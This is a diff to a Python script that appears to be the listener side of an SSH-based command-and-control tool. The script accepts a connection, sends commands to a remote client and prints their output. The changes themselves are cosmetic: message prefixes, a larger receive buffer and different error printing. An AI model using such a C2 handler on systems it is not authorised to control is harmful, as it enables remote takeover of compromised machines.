@@ -40,7 +40,7 @@ def main():
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind((server, port))
         sock.listen()
-        print('Listening for connections...')
+        print('[*] Listening for connections...')
         client, addr = sock.accept()
     except KeyboardInterrupt:
         quit()
@@ -49,9 +49,9 @@ def main():
     server = SSHServer()
     C2_Session.start_server(server=server)
     chan = C2_Session.accept()
-    print('Debug info:\n' + str(chan)) #Debug info
+    print('[*] Debug info:\n' + str(chan)) #Debug info
     if chan is None:
-        print('Failled authentication.')
+        print('[!] Failled authentication.')
         sys.exit()
     success_msg = chan.recv(1024).decode()
     print(f'{success_msg}')
@@ -77,7 +77,7 @@ def main():
                 else:
                     try:
                         chan.send(command)
-                        output = chan.recv(8192)
+                        output = chan.recv(10240)
                         print(output.decode())
                     except SystemError:
                         pass
@@ -93,5 +93,4 @@ if __name__ == '__main__':
     try:
         main()
     except Exception as ex:
-        parser.print_help(sys.stderr)
-        #print("Debug info:\n" + str(ex))
+        print(str(ex))
